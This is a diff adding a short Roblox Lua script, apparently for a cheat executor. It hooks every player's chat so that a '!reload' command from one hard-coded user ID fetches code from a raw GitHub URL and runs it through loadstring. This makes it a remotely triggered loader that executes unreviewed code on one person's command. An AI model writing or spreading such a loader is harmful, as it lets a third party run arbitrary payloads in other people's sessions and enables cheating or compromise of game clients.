@@ -1,0 +1,29 @@
+local chatBotPrefix = "!"
+local allowedUserID = 2236295191 -- Replace with the desired User ID
+
+local function sendReloadMessageToChatBot(player)
+    local reloadMessage = "Tested"
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(reloadMessage, "All")
+end
+
+local function onChatted(player, message)
+    local lowercaseMessage = string.lower(message)
+    if lowercaseMessage:sub(1, 1) == chatBotPrefix then
+        local command = lowercaseMessage:sub(2)
+
+        if command == "reload" then
+            if player.UserId == allowedUserID then
+               loadstring(game:HttpGet("https://raw.githubusercontent.com/OhDaddyUwu/The-Bleufox-Script/main/Script"))()
+
+            else
+                print("no")
+            end
+        end
+    end
+end
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg)
+        onChatted(player, msg)
+    end)
+end
